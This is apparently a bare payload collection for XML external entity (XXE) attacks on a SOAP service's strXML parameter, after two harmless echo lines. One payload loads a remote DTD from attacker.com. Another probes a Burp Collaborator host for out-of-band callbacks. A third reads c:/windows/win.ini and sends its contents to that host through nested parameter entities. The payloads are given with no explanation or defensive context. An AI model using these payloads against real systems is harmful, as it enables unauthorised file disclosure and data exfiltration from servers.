echo "Hello"
echo "Done"


<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">
%remote;
]>
<strXML>test</strXML>



<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [
<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR/xxe">
%remote;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Execute xmlns="http://tempuri.org/">
      <strXML>test</strXML>
    </Execute>
  </soap:Body>
</soap:Envelope>



<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR/?%file;'>">
%eval;
%exfil;
]>
<soap:Envelope>
  <soap:Body>
    <Execute>
      <strXML>test</strXML>
    </Execute>
  </soap:Body>
</soap:Envelope>